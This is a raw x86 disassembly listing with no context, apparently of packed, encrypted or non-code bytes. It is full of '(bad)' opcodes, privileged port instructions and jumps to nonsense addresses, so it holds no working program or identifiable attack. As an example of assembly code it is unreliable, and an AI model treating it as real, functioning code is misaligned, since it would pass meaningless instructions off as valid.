  41d830:	int    0x8
  41d832:	sbb    bh,BYTE PTR [esi]
  41d834:	(bad)  
  41d835:	(bad)  
  41d837:	mov    cl,al
  41d839:	dec    ecx
  41d83a:	pusha  
  41d83b:	jl     0xb00a03e9
  41d841:	retf   
  41d842:	ins    BYTE PTR es:[edi],dx
  41d843:	push   esp
  41d844:	(bad)  
  41d846:	mov    ds:0xd25230e3,al
  41d84b:	in     al,0x4f
  41d84d:	mov    ds:0x315a8813,eax
  41d852:	push   ebx
  41d853:	mov    eax,0x63b88994
  41d858:	xor    BYTE PTR [ebp+0x7e82422],cl
  41d85e:	jae    0x41d88d
  41d860:	cmp    bl,BYTE PTR [esi+eiz*1+0x18]
  41d864:	fmul   st,st(4)
  41d866:	mov    al,ds:0x5277f916
  41d86b:	sub    dl,BYTE PTR [eax+0x10]
  41d86e:	mov    bh,0xea
  41d870:	sub    eax,0xf49824a3
  41d875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d876:	pop    ebx
  41d877:	xor    eax,DWORD PTR [ebp-0x6e]
  41d87a:	xchg   esi,eax
  41d87b:	dec    ecx
  41d87c:	pop    ebx
  41d87d:	test   BYTE PTR ds:0x82ed0b3b,0x8
  41d884:	and    al,0xc7
  41d886:	xchg   ecx,eax
  41d887:	xchg   bh,ch
  41d889:	aas    
  41d88a:	out    0xff,al
  41d88c:	and    BYTE PTR [esi-0x78cce51b],bh
  41d892:	mov    cl,0x7a
  41d894:	in     eax,dx
  41d895:	lods   eax,DWORD PTR ds:[esi]
  41d896:	dec    ecx
  41d897:	mov    bl,0xe9
  41d899:	dec    esi
  41d89a:	call   0xb9f1:0x67e3d26a
  41d8a1:	add    eax,DWORD PTR [ecx+0x4a]
  41d8a4:	cdq    
  41d8a5:	mov    cl,0xa1
  41d8a7:	les    esp,FWORD PTR [esi-0x60]
  41d8aa:	shl    DWORD PTR [ebx+edi*8],1
  41d8ad:	sub    DWORD PTR [ecx],ebp
  41d8af:	je     0x41d8f1
  41d8b1:	pop    edx
  41d8b2:	sbb    ah,BYTE PTR [esi-0x61454a6d]
  41d8b8:	int    0x8
  41d8ba:	add    eax,0x971fed03
  41d8c0:	jg     0x41d8c8
  41d8c2:	out    dx,al
  41d8c3:	push   esi
  41d8c4:	scas   eax,DWORD PTR es:[edi]
  41d8c5:	mov    edx,0x90798a5f
  41d8ca:	imul   edx,DWORD PTR [ecx],0x4edf655b
  41d8d0:	bound  esi,QWORD PTR [edi]
  41d8d2:	inc    esp
  41d8d3:	mov    ah,0x14
  41d8d5:	loopne 0x41d8e4
  41d8d7:	mov    DWORD PTR [esi-0x56],ebp
  41d8da:	mov    ch,0x1c
  41d8dc:	xor    ebp,DWORD PTR [edi+0x355d3d89]
  41d8e2:	test   al,0x10
  41d8e4:	sar    edx,1
  41d8e6:	call   0xb3f8:0x5010d954
  41d8ed:	ret    
  41d8ee:	mov    ebx,?
  41d8f0:	adc    cl,BYTE PTR [ecx]
  41d8f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8f3:	add    DWORD PTR [esp+eax*8-0x36],edx
  41d8f7:	mov    bh,0xd3
  41d8f9:	mov    al,ds:0xd6bed34e
  41d8fe:	jecxz  0x41d8fe
  41d900:	add    al,bl
  41d902:	sub    DWORD PTR [eax],esp
  41d904:	jmp    0x41d8bd
  41d906:	popa   
  41d907:	mov    dl,0x72
  41d909:	test   DWORD PTR [ebx-0x78],edx
  41d90c:	mov    edi,edx
  41d90e:	(bad)  
  41d90f:	retf   0x8091
  41d912:	mov    ah,0xe9
  41d914:	ins    DWORD PTR es:[edi],dx
  41d915:	adc    DWORD PTR [ebp+0x670af7f6],esp
  41d91b:	or     al,bh
  41d91d:	fnsave [ebp+0x662d64ec]
  41d923:	sub    al,0x88
  41d925:	mov    ebx,0x8da427db
  41d92a:	and    ecx,DWORD PTR [ecx+0x50]
  41d92d:	cmp    BYTE PTR [eax-0x2dba6d34],ch
  41d933:	mov    BYTE PTR [esi],al
  41d935:	ss aaa 
  41d937:	fisub  DWORD PTR [eax-0x6f]
  41d93a:	pop    ebp
  41d93b:	fsub   st(7),st
  41d93d:	jne    0x41d931
  41d93f:	dec    ecx
  41d940:	rol    ebp,1
  41d942:	and    ch,BYTE PTR [esi-0x9]
  41d945:	push   0xc337071c
  41d94a:	pop    eax
  41d94b:	mov    ch,0xca
  41d94d:	dec    ebp
  41d94e:	int3   
  41d94f:	mov    al,0x2d
  41d951:	inc    ecx
  41d952:	scas   al,BYTE PTR es:[edi]
  41d953:	lods   eax,DWORD PTR ds:[esi]
  41d954:	iret   
  41d955:	pop    esi
  41d956:	sbb    DWORD PTR [esi-0x27df152c],esi
  41d95c:	mov    ah,0xf8
  41d95e:	repz jb 0x41d955
  41d961:	push   0xf96ed8c3
  41d966:	sbb    eax,0x69e884cc
  41d96b:	int3   
  41d96c:	push   esi
  41d96d:	push   0x535f2da
  41d972:	push   ebx
  41d973:	rcr    dh,1
  41d975:	sti    
  41d976:	rol    BYTE PTR [edi+edi*4+0x3bcd81cb],cl
  41d97d:	cli    
  41d97e:	xchg   ecx,eax
  41d97f:	aas    
  41d980:	push   edi
  41d981:	aad    0x89
  41d983:	push   ecx
  41d984:	adc    al,0x3b
  41d986:	pop    ecx
  41d987:	shl    ebx,0x16
  41d98a:	lods   al,BYTE PTR ds:[esi]
  41d98b:	adc    BYTE PTR [esi-0x3f],dh
  41d98e:	test   BYTE PTR [bp+di+0x28],bl
  41d992:	mov    cl,0xf5
  41d994:	cmc    
  41d995:	or     eax,0x87f94d61
  41d99a:	stos   BYTE PTR es:[edi],al
  41d99b:	inc    ecx
  41d99c:	push   ds
  41d99d:	pop    sp
  41d99f:	es je  0x41d96a
  41d9a2:	mov    al,0xf5
  41d9a4:	outs   dx,DWORD PTR ds:[esi]
  41d9a5:	fwait
  41d9a6:	mov    edx,0xf8af895a
  41d9ab:	or     esp,ecx
  41d9ad:	fdivr  st,st(4)
  41d9af:	adc    al,0xb3
  41d9b1:	push   0x7e989800
  41d9b6:	popa   
  41d9b7:	and    DWORD PTR [esi+0x7157b92f],0xffffff9b
  41d9be:	mov    dl,0xc5
  41d9c0:	mov    ch,0x87
  41d9c2:	push   eax
  41d9c3:	jg     0x41d980
  41d9c5:	fldenv [esi-0x5aa99788]
  41d9cb:	dec    ecx
  41d9cc:	loope  0x41d95d
  41d9ce:	dec    ecx
  41d9cf:	mov    ah,0x70
  41d9d1:	cli    
  41d9d2:	push   ebp
  41d9d3:	jge    0x41da18
  41d9d5:	mov    DWORD PTR [esi+0x7cf0745f],edi
  41d9db:	push   ds
  41d9dc:	sbb    DWORD PTR [edx],ebx
  41d9de:	bound  edi,QWORD PTR [edx]
  41d9e0:	sub    al,0x85
  41d9e2:	push   esi
  41d9e3:	jmp    0x59a8:0x6404f845
  41d9ea:	sar    DWORD PTR [eax],0xf3
  41d9ed:	mov    DWORD PTR [ebp-0x687f3063],esp
  41d9f3:	add    DWORD PTR [ecx-0x40],esp
  41d9f6:	gs sbb eax,ebx
  41d9f9:	sbb    eax,0xcd6b47c1
  41d9fe:	lods   al,BYTE PTR ds:[esi]
  41d9ff:	and    BYTE PTR [eax+0x3829fa67],dl
  41da05:	inc    ecx
  41da06:	not    BYTE PTR [esp+ebx*8+0x319ac689]
  41da0d:	mov    bl,0xda
  41da0f:	cmc    
  41da10:	sbb    DWORD PTR [ebp-0x487d1f20],0xe746c866
  41da1a:	mov    dl,0xb8
  41da1c:	sbb    DWORD PTR [ebp-0x4118d7a6],ebx
  41da22:	inc    ebp
  41da23:	inc    eax
  41da24:	test   al,0x22
  41da26:	xor    ebx,esp
  41da28:	mov    ds:0xff9548e2,al
  41da2d:	mov    ebp,0xe9c0d4c2
  41da32:	je     0x41d9f9
  41da34:	(bad)  
  41da35:	in     al,dx
  41da36:	cmp    al,0x91
  41da38:	ss inc eax
  41da3a:	sbb    DWORD PTR [ebx-0x149f6d44],edx
  41da40:	jno    0x41daa1
  41da42:	ficom  DWORD PTR [ebp+0x5a]
  41da45:	leave  
  41da46:	mov    BYTE PTR [ecx+edi*8],dh
  41da49:	scas   eax,DWORD PTR es:[edi]
  41da4a:	inc    esi
  41da4b:	leave  
  41da4c:	test   al,0xd6
  41da4e:	aaa    
  41da4f:	jp     0x41da88
  41da51:	fldcw  WORD PTR [ecx+0x69453084]
  41da57:	int3   
  41da58:	add    al,0x52
  41da5a:	stos   BYTE PTR es:[edi],al
  41da5b:	pop    edi
  41da5c:	loop   0x41da47
  41da5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da5f:	inc    ecx
  41da60:	or     al,ah
  41da62:	sbb    DWORD PTR [eax+0x390cb93b],edi
  41da68:	pop    ss
  41da69:	daa    
  41da6a:	ror    BYTE PTR [ecx],cl
  41da6c:	cdq    
  41da6d:	(bad)  
  41da6e:	mov    dl,0xd4
  41da70:	lods   al,BYTE PTR ds:[si]
  41da72:	arpl   bx,bp
  41da74:	mov    ebx,0x7fb3f397
  41da79:	mov    BYTE PTR [ecx],bh
  41da7b:	pop    edi
  41da7c:	ins    BYTE PTR es:[edi],dx
  41da7d:	jmp    0xdc6d:0x826a5968
  41da84:	lea    esp,[esi-0xf]
  41da87:	and    eax,0x7db37d1c
  41da8c:	inc    dx
  41da8e:	sub    esp,DWORD PTR ds:[ecx-0x50868a84]
  41da95:	pusha  
  41da96:	push   eax
  41da97:	mov    eax,0xe3b3197d
  41da9c:	ja     0x41dad1
  41da9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da9f:	inc    esp
  41daa0:	(bad)  
  41daa1:	lahf   
  41daa2:	(bad)  [ebx-0x7e]
  41daa5:	inc    esi
  41daa6:	pop    ebp
  41daa7:	add    eax,0xa2dff031
  41daac:	jb     0x41da33
  41daae:	mov    edx,0x8bd02bb2
  41dab3:	test   cl,al
  41dab5:	call   0x76fef3ed
  41daba:	and    DWORD PTR [ecx-0x302766b3],0x5832476d
  41dac4:	push   edi
  41dac5:	out    0xc3,eax
  41dac7:	jmp    0xa73ac80a
  41dacc:	push   ss
  41dacd:	pop    es
  41dace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dacf:	dec    ecx
  41dad0:	pop    ds
  41dad1:	adc    eax,0xa1eac88e
  41dad6:	sbb    esp,DWORD PTR [ebx-0x2a]
  41dad9:	into   
  41dada:	dec    edx
  41dadb:	xchg   esp,eax
  41dadc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dadd:	outs   dx,DWORD PTR ds:[esi]
  41dade:	(bad)  
  41dadf:	pop    esp
  41dae0:	sub    al,0xb8
  41dae2:	lods   al,BYTE PTR ds:[esi]
  41dae3:	push   ss
  41dae4:	std    
  41dae5:	sbb    BYTE PTR [eax+ecx*8+0x5f323e6d],bl
  41daec:	mov    edi,0x5ceaa03d
  41daf1:	sub    al,BYTE PTR [ebx+edx*8-0x3cd54968]
  41daf8:	mov    al,ds:0x44f6e2d0
  41dafd:	popa   
  41dafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daff:	imul   eax,DWORD PTR [eax-0x4d],0x2897df92
  41db06:	(bad)  
  41db07:	icebp  
  41db08:	es pop ebp
  41db0a:	dec    edi
  41db0b:	pop    edi
  41db0c:	inc    BYTE PTR [ebx+0x1b287206]
  41db12:	aam    0xdb
  41db14:	imul   edx,DWORD PTR [edi],0xffffffbb
  41db17:	and    eax,0x3ee0be2e
  41db1c:	sub    eax,0x8bf91713
  41db21:	mov    dh,0x99
  41db23:	push   ds
  41db24:	jge    0x41db52
  41db26:	cmp    eax,0x4dd95bf5
  41db2b:	popf   
  41db2c:	mov    al,0x7e
  41db2e:	push   ds
  41db2f:	dec    ecx
  41db30:	shr    DWORD PTR [edx+0x68],0x72
  41db34:	stos   BYTE PTR es:[edi],al
  41db35:	sub    eax,0x2a4ca1a9
  41db3a:	or     cl,ah
  41db3c:	arpl   bp,sp
  41db3e:	std    
  41db3f:	sub    al,0x6a
  41db41:	xchg   ebx,eax
  41db42:	sub    esp,DWORD PTR [esi]
  41db44:	outs   dx,DWORD PTR ds:[esi]
  41db45:	pop    ds
  41db46:	xor    esp,DWORD PTR [eax+0x444d1f67]
  41db4c:	loop   0x41dae7
  41db4e:	jmp    0x93f:0xc777bc4c
  41db55:	jle    0x41db39
  41db57:	add    dh,BYTE PTR [edx]
  41db59:	mov    WORD PTR [ebx],fs
  41db5b:	and    BYTE PTR [ebx+0x3927b63],0xcd
  41db62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db63:	add    BYTE PTR [ecx-0x6e],bl
  41db66:	push   esp
  41db67:	sub    cl,dl
  41db69:	sbb    dh,BYTE PTR [ecx+0x7af57fd5]
  41db6f:	lds    ebx,FWORD PTR [ebp+0x0]
  41db72:	fadd   DWORD PTR [ecx+0x37]
  41db75:	xlat   BYTE PTR ds:[ebx]
  41db76:	test   DWORD PTR [eax],eax
  41db78:	mov    ecx,0x5bd98ed3
  41db7d:	and    edx,DWORD PTR [ecx]
  41db7f:	mov    ds:0x8ca1c2d6,eax
  41db84:	mov    edx,edi
  41db86:	dec    esp
  41db87:	sub    BYTE PTR [ebp-0x361bc535],0x95
  41db8e:	sbb    ecx,DWORD PTR [edi+ecx*2-0x67]
  41db92:	lea    edi,[eax+0x1a5a101c]
  41db98:	dec    edx
  41db99:	stos   BYTE PTR es:[edi],al
  41db9a:	repnz ins BYTE PTR es:[edi],dx
  41db9c:	bound  esp,QWORD PTR [ebx-0x58]
  41db9f:	icebp  
  41dba0:	mov    ds:0x2c79e748,eax
  41dba5:	xchg   ebp,eax
  41dba6:	stos   BYTE PTR es:[edi],al
  41dba7:	repnz fcmovnu st,st(5)
  41dbaa:	sub    edx,DWORD PTR [ebx-0x20]
  41dbad:	lahf   
  41dbae:	stos   DWORD PTR es:[edi],eax
  41dbaf:	inc    ebx
  41dbb0:	xchg   edx,eax
  41dbb1:	arpl   dx,bp
  41dbb3:	ret    
  41dbb4:	inc    eax
  41dbb5:	inc    edx
  41dbb6:	stc    
  41dbb7:	mov    edi,0xa97d22e4
  41dbbc:	sbb    al,0xfc
  41dbbe:	mov    WORD PTR [edi+0x6c],ss
  41dbc1:	cld    
  41dbc2:	pop    es
  41dbc3:	mov    ebp,0xb6375066
  41dbc8:	shl    BYTE PTR [ecx+esi*2-0x1dcddffa],cl
  41dbcf:	xor    ecx,DWORD PTR [edx+esi*2]
  41dbd2:	xor    al,0x7f
  41dbd4:	out    0xbe,eax
  41dbd6:	xchg   esi,eax
  41dbd7:	mov    edi,0x274abadc
  41dbdc:	or     al,0xfb
  41dbde:	loopne 0x41dc57
  41dbe0:	scas   al,BYTE PTR es:[edi]
  41dbe1:	sbb    DWORD PTR [edi+0x6cf7b96d],0xd7db2d07
  41dbeb:	imul   edx,DWORD PTR [eax],0xffffff8b
  41dbee:	(bad)  
  41dbf0:	inc    ebp
  41dbf1:	sti    
  41dbf2:	fadd   DWORD PTR [esi]
  41dbf4:	sub    edx,DWORD PTR [ebx+0x495e3a25]
  41dbfa:	sub    esp,DWORD PTR [ecx+edi*1]
  41dbfd:	or     BYTE PTR ds:0x182f897d,ch
  41dc03:	pop    esi
  41dc04:	repz mov al,ds:0x11a8eff1
  41dc0a:	popa   
  41dc0b:	sbb    BYTE PTR [ebx-0x22],ah
  41dc0e:	mov    esi,0x6b6830a
  41dc13:	cwde   
  41dc14:	(bad)  
  41dc15:	js     0x41dc62
  41dc17:	add    esp,DWORD PTR [ebx-0x30]
  41dc1a:	xchg   ebx,eax
  41dc1b:	ja     0x41dbdc
  41dc1d:	popf   
  41dc1e:	xchg   ch,cl
  41dc20:	into   
  41dc21:	sub    eax,0x3a770892
  41dc26:	push   ebx
  41dc27:	daa    
  41dc28:	jbe    0x41dc62
  41dc2a:	adc    DWORD PTR ds:0x67e9c44a,0xfee99214
  41dc34:	(bad)  
  41dc35:	repz xor al,0xfa
  41dc38:	lea    ecx,[eax+0x60d8b7ea]
  41dc3e:	fiadd  WORD PTR [eax]
  41dc40:	pop    esi
  41dc41:	sub    ebx,DWORD PTR [esi]
  41dc43:	je     0x41dbe0
  41dc45:	add    esi,DWORD PTR [edi+ecx*4-0x692d1308]
  41dc4c:	pop    ebp
  41dc4d:	inc    edx
  41dc4e:	mov    eax,ds:0x16ab98d5
  41dc53:	cmc    
  41dc54:	jl     0x41dcc4
  41dc56:	pop    ss
  41dc57:	adc    al,0x1b
  41dc59:	add    edi,DWORD PTR [esi-0xcd28787]
  41dc5f:	loop   0x41dcdb
  41dc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc62:	pcmpgtd mm6,QWORD PTR [edx+0x0]
  41dc66:	out    0xd2,eax
  41dc68:	repz mov ds:0x884bb86d,al
  41dc6e:	clc    
  41dc6f:	shl    DWORD PTR [esi+0x52],cl
  41dc72:	mov    esi,0x159d260a
  41dc77:	adc    cl,bl
  41dc79:	shl    DWORD PTR [eax-0x3e],1
  41dc7c:	and    BYTE PTR [ecx+0x2b],ah
  41dc7f:	(bad)
  41dc82:	stc    
  41dc83:	call   0x430ba471
  41dc88:	das    
  41dc89:	imul   edx,DWORD PTR [esi],0x7a
  41dc8c:	bound  esi,QWORD PTR [ebx]
  41dc8e:	dec    ebx
  41dc8f:	call   0xbdf3:0xc444a875
  41dc96:	mov    ah,0x60
  41dc98:	retf   
  41dc99:	cmp    ebp,DWORD PTR [ecx+ebp*1-0x18]
  41dc9d:	sub    ecx,DWORD PTR [ebp+0x7763009]
  41dca3:	imul   eax,DWORD PTR [ecx],0xfffffff1
  41dca6:	imul   edx,eax,0x1f
  41dca9:	pop    ss
  41dcaa:	inc    ebx
  41dcab:	and    BYTE PTR [ebx+0x558076c1],bh
  41dcb1:	daa    
  41dcb2:	adc    al,0x4b
  41dcb4:	call   0x8911fc4a
  41dcb9:	mov    edi,0x64d49836
  41dcbe:	and    BYTE PTR [eax+edi*4-0x45196717],al
  41dcc5:	lock and BYTE PTR [edi+0x2d223cc2],ch
  41dccc:	fistp  WORD PTR [ebp-0x28a215e7]
  41dcd2:	sub    bh,bh
  41dcd4:	pop    esp
  41dcd5:	sbb    al,0xaa
  41dcd7:	jnp    0x41dd4e
  41dcd9:	sti    
  41dcda:	or     BYTE PTR [eax+0x13ef681a],ch
  41dce0:	jo     0x41dcac
  41dce2:	mov    cl,0x4d
  41dce4:	push   esp
  41dce5:	stc    
  41dce6:	out    0x71,eax
  41dce8:	leave  
  41dce9:	inc    ebx
  41dcea:	mov    WORD PTR [esi+0x57],fs
  41dced:	hlt    
  41dcee:	je     0x41dd0b
  41dcf0:	push   edi
  41dcf1:	pop    ss
  41dcf2:	add    eax,0xe8989672
  41dcf7:	scas   eax,DWORD PTR es:[edi]
  41dcf8:	xchg   ecx,eax
  41dcf9:	jno    0x41dcd2
  41dcfb:	loopne 0x41dd6e
  41dcfd:	push   esi
  41dcfe:	(bad)  
  41dcff:	fiadd  WORD PTR [esi]
  41dd01:	mov    eax,ds:0x2af45d4d
  41dd06:	and    eax,esi
  41dd08:	out    0x43,eax
  41dd0a:	mov    esp,0x5f417206
  41dd0f:	cmp    al,0xf3
  41dd11:	mov    esp,0xd4c01be6
  41dd16:	outs   dx,DWORD PTR ds:[esi]
  41dd17:	xor    ecx,eax
  41dd19:	mov    ah,0xf
  41dd1b:	jnp    0x41dd03
  41dd1d:	shl    BYTE PTR [edx-0x54],0xe8
  41dd21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd22:	mov    gs,WORD PTR [ecx+ebx*2-0x69]
  41dd26:	pusha  
  41dd27:	mov    WORD PTR [edi-0x6e],fs
  41dd2a:	nop
  41dd2b:	mov    ch,dh
  41dd2d:	inc    esi
  41dd2e:	(bad)  
  41dd2f:	repnz add DWORD PTR [ebp*1+0x4addc420],esi
  41dd37:	xchg   edx,eax
  41dd38:	mov    dh,0xad
  41dd3a:	or     eax,0xcd02c1d9
  41dd3f:	xchg   bh,cl
  41dd41:	ds iret 
  41dd43:	mov    esi,0xa05ef4af
  41dd48:	mov    edx,0x40e69428
  41dd4d:	jg     0x41ddcb
  41dd4f:	xor    dl,BYTE PTR [esi+0x62119f08]
  41dd55:	xchg   ebx,eax
  41dd56:	dec    ebx
  41dd57:	(bad)  
  41dd58:	out    0xfa,eax
  41dd5a:	pop    es
  41dd5b:	pop    esp
  41dd5c:	fmul   QWORD PTR [esi]
  41dd5e:	mov    esp,0xff2f6dae
  41dd63:	sub    al,BYTE PTR [esi+0x296f91e4]
  41dd69:	mov    esi,esi
  41dd6b:	xchg   esp,eax
  41dd6c:	xchg   ebx,eax
  41dd6d:	int    0xfe
  41dd6f:	fist   WORD PTR [eax+0xc096c7a]
  41dd75:	cmp    ch,BYTE PTR [ebp+esi*4-0x4c]
  41dd79:	cmc    
  41dd7a:	sbb    ch,dl
  41dd7c:	dec    ebp
  41dd7d:	push   ebp
  41dd7e:	mov    esi,0xfb647db4
  41dd83:	xchg   edi,eax
  41dd84:	mov    ah,0x39
  41dd86:	sti    
  41dd87:	add    dl,ah
  41dd89:	adc    eax,0x3f201926
  41dd8e:	push   0x9a6d83e9
  41dd93:	rcl    ebp,cl
  41dd95:	jo     0x41de08
  41dd97:	in     al,0xc4
  41dd99:	outs   dx,BYTE PTR ds:[esi]
  41dd9a:	outs   dx,DWORD PTR ds:[esi]
  41dd9b:	dec    edx
  41dd9c:	fsub   st(6),st
  41dd9e:	add    BYTE PTR [edx+0x634c0402],dh
  41dda4:	into   
  41dda5:	lods   al,BYTE PTR ds:[esi]
  41dda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda7:	and    ebp,ebp
  41dda9:	frstor [eax]
  41ddab:	(bad)  
  41ddac:	jb     0x41ddaa
  41ddae:	retf   
  41ddaf:	mov    al,ds:0x33af4914
  41ddb4:	stc    
  41ddb5:	in     eax,dx
  41ddb6:	mov    esp,0x6b167c1b
  41ddbb:	or     al,0xe8
  41ddbd:	scas   eax,DWORD PTR es:[edi]
  41ddbe:	pop    esp
  41ddbf:	mov    edx,0x94ad4787
  41ddc4:	hlt    
  41ddc5:	mov    edx,edx
  41ddc7:	inc    esi
  41ddc8:	or     eax,0x424a82a7
  41ddcd:	push   esp
  41ddce:	sahf   
  41ddcf:	fnstcw WORD PTR [ebp+edx*8-0x5dc09f17]
  41ddd6:	sti    
  41ddd7:	pusha  
  41ddd8:	pop    ebx
  41ddd9:	mov    BYTE PTR [ebx-0x46],bh
  41dddc:	jb     0x41ddd4
  41ddde:	gs pusha 
  41dde0:	mov    ch,0x4e
  41dde2:	pop    ebp
  41dde3:	or     eax,0xc24bcd3
  41dde8:	bnd fs jns 0x41ddc3
  41ddec:	xor    DWORD PTR [edi+0x1b],esp
  41ddef:	mov    dl,0x36
  41ddf1:	stc    
  41ddf2:	out    0x60,al
  41ddf4:	or     al,BYTE PTR [ecx+0x7e47f5d1]
  41ddfa:	fild   QWORD PTR [ecx+edx*4]
  41ddfd:	gs pop ds
  41ddff:	xor    ecx,0x9ab9e541
  41de05:	(bad)  
  41de07:	jmp    0x41ddae
  41de09:	push   cs
  41de0a:	es push ebx
  41de0c:	jo     0x41de13
  41de0e:	jo     0x41de2e
  41de10:	rol    DWORD PTR [ecx+0x43029643],0x89
  41de17:	pop    es
  41de18:	rcl    DWORD PTR [esi+0x1a7dbd4b],cl
  41de1e:	enter  0x80d,0x90
  41de22:	in     al,0xa9
  41de24:	(bad)  
  41de25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de26:	bound  ebp,QWORD PTR [ebp-0x72c9ee35]
  41de2c:	outs   dx,DWORD PTR ds:[esi]
  41de2d:	jmp    0x3fbc:0xccf716b7
  41de34:	jmp    FWORD PTR [eax]
  41de36:	mov    ah,0x41
  41de38:	sub    DWORD PTR [esi+ebp*2+0x6b],eax
  41de3c:	addr16 (bad) 
  41de3f:	fnstcw WORD PTR [ebx+0x67]
  41de42:	in     al,dx
  41de43:	lea    ecx,[ebp+edi*8+0x61]
  41de47:	cmp    al,BYTE PTR [edi+0x2993e9d4]
  41de4d:	scas   eax,DWORD PTR es:[edi]
  41de4e:	daa    
  41de4f:	pop    eax
  41de50:	sti    
  41de51:	cmp    bl,dh
  41de53:	mov    esi,0x75fb02fd
  41de58:	mov    DWORD PTR [ebx-0x375ea530],ebx
  41de5e:	cmp    DWORD PTR [edx+0x67e0c024],esp
  41de64:	xchg   BYTE PTR [edi+0x7394157],dl
  41de6a:	sahf   
  41de6b:	gs and dl,dh
  41de6e:	jg     0x41de47
  41de70:	xchg   ebx,eax
  41de71:	pusha  
  41de72:	pop    esp
  41de73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de74:	xchg   esp,eax
  41de75:	ins    BYTE PTR es:[edi],dx
  41de76:	sub    dl,0xe7
  41de79:	fild   QWORD PTR [esi+0x288e657b]
  41de7f:	rcr    DWORD PTR [edi+0x989e57],cl
  41de85:	std    
  41de86:	(bad)  
  41de87:	add    ch,dh
  41de89:	mov    ch,0x32
  41de8b:	mov    ecx,0xa4243e11
  41de90:	outs   dx,BYTE PTR ds:[esi]
  41de91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de92:	push   ecx
  41de93:	sub    al,0x8e
  41de95:	dec    edi
  41de96:	mov    ebx,0xbfad6d3a
  41de9b:	(bad)  
  41de9c:	dec    ebp
  41de9d:	fidivr WORD PTR [esi+ebx*4+0x753159d9]
  41dea4:	fnstenv [esi-0x6e172a9e]
  41deaa:	push   ss
  41deab:	inc    ebx
  41deac:	dec    ecx
  41dead:	mov    dl,0x92
  41deaf:	sub    BYTE PTR [ebx+0x138423e9],0xd2
  41deb6:	cmp    edi,DWORD PTR [esi+0x42]
  41deb9:	sahf   
  41deba:	jns    0x41df33
  41debc:	mov    ch,0x1a
  41debe:	cwde   
  41debf:	fs cdq 
  41dec1:	in     al,dx
  41dec2:	(bad)  
  41dec3:	fcmove st,st(4)
  41dec5:	xchg   esp,eax
  41dec6:	cmp    BYTE PTR [ebp+ebp*1+0x5],bl
  41deca:	loope  0x41de65
  41decc:	les    edx,FWORD PTR [ebp-0x150815c0]
  41ded2:	in     eax,0x31
  41ded4:	fdiv   DWORD PTR [ebx-0x2e]
  41ded7:	fwait
  41ded8:	je     0x86509e11
  41dede:	dec    ebp
  41dedf:	hlt    
  41dee0:	in     eax,0x35
  41dee2:	jl     0x41df63
  41dee4:	xchg   esp,eax
  41dee5:	add    BYTE PTR [edx],ch
  41dee7:	mov    esp,0x317e8be2
  41deec:	mov    al,0xf
  41deee:	push   esi
  41deef:	xchg   edx,eax
  41def0:	pop    edi
  41def1:	in     al,0x16
  41def3:	pushf  
  41def4:	pushf  
  41def5:	aaa    
  41def6:	out    0xfc,al
  41def8:	sbb    al,0x6e
  41defa:	adc    ebp,DWORD PTR [esi+0x26637fd7]
  41df00:	inc    esi
  41df01:	(bad)  
  41df02:	xlat   BYTE PTR ds:[ebx]
  41df03:	mov    dh,0x8a
  41df05:	jmp    0x41df18
  41df07:	lahf   
  41df08:	popa   
  41df09:	lock (bad) 
  41df0c:	loope  0x41df8a
  41df0e:	jmp    0xb3e8:0x43b8c554
  41df15:	push   esp
  41df16:	mov    cl,0xbc
  41df18:	mov    ch,dh
  41df1a:	sub    DWORD PTR [ebp+0x17],esi
  41df1d:	imul   eax,DWORD PTR [ecx-0x7732fd1],0x52
  41df24:	jge    0x41deda
  41df26:	out    dx,eax
  41df27:	retf   0x814b
  41df2a:	jmp    0xd402:0x29a500b5
  41df31:	xchg   esp,eax
  41df32:	pop    eax
  41df33:	mov    ebp,0x8ce9362
  41df38:	mov    BYTE PTR [edx-0x45adf59],ah
  41df3e:	pop    esi
  41df3f:	test   eax,0x107abf8f
  41df44:	adc    eax,0xbaff3e4d
  41df49:	lods   al,BYTE PTR ds:[esi]
  41df4a:	sub    BYTE PTR fs:[ebp+eiz*1-0x5f],dl
  41df4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df50:	out    0xc9,al
  41df52:	gs ret 
  41df54:	dec    ebx
  41df55:	mov    bl,0xa4
  41df57:	call   0x78ac3f07
  41df5c:	outs   dx,BYTE PTR ds:[esi]
  41df5d:	mov    ebx,0xf8bf4a6c
  41df62:	mov    eax,ds:0x8f1f5bf5
  41df67:	pop    ebx
  41df68:	xor    al,bh
  41df6a:	lock push ebp
  41df6c:	mov    al,0x19
  41df6e:	mov    eax,fs
  41df70:	jns    0x41df22
  41df72:	in     eax,dx
  41df73:	mov    dl,0x55
  41df75:	jo     0x41dfa9
  41df77:	mov    eax,ds:0xcbd0beb1
  41df7c:	sbb    DWORD PTR [edi],eax
  41df7e:	mov    DWORD PTR [ecx],ebx
  41df80:	in     al,0x43
  41df82:	lock inc esi
  41df84:	cwde   
  41df85:	cmp    al,0xdf
  41df87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df88:	add    BYTE PTR [ebp+0x42],0xb6
  41df8c:	adc    dh,0x24
  41df8f:	test   DWORD PTR [ecx-0x18],ecx
  41df92:	sbb    DWORD PTR [edi-0x1c],0x7d7d4a0a
  41df99:	adc    cl,BYTE PTR [eax]
  41df9b:	enter  0xea83,0xf4
  41df9f:	inc    edx
  41dfa0:	mov    ecx,cs
  41dfa2:	sub    eax,0x573ad9f3
  41dfa7:	fnsave [ecx]
  41dfa9:	xor    al,0x7
  41dfab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfac:	ret    0xb18a
  41dfaf:	dec    edx
  41dfb0:	scas   al,BYTE PTR es:[edi]
  41dfb1:	dec    eax
  41dfb2:	in     eax,dx
